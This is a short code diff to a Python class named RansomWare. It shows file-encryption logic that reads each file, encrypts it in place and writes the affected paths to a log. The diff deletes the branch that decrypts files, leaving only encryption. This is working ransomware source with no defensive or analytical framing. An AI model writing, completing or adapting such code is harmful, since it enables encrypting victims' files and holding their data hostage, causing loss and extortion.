@@ -84,8 +84,6 @@ class RansomWare:
             data = f.read()
             if not encrypted:
                 _data = self.crypter.encrypt(data)
-            else:
-                _data = self.crypter.decrypt(data)
         with open(file_path, 'wb') as fp:
             fp.write(_data)
         if not encrypted:
@@ -98,7 +96,6 @@ class RansomWare:
         with open(self.log_path, 'w') as f:
             for file_path in self.crypted_files:
                 f.write(f"{file_path}\n")
-            #f.write('-1')
         self.write_complete_event.set()
     
     def read_log(self):
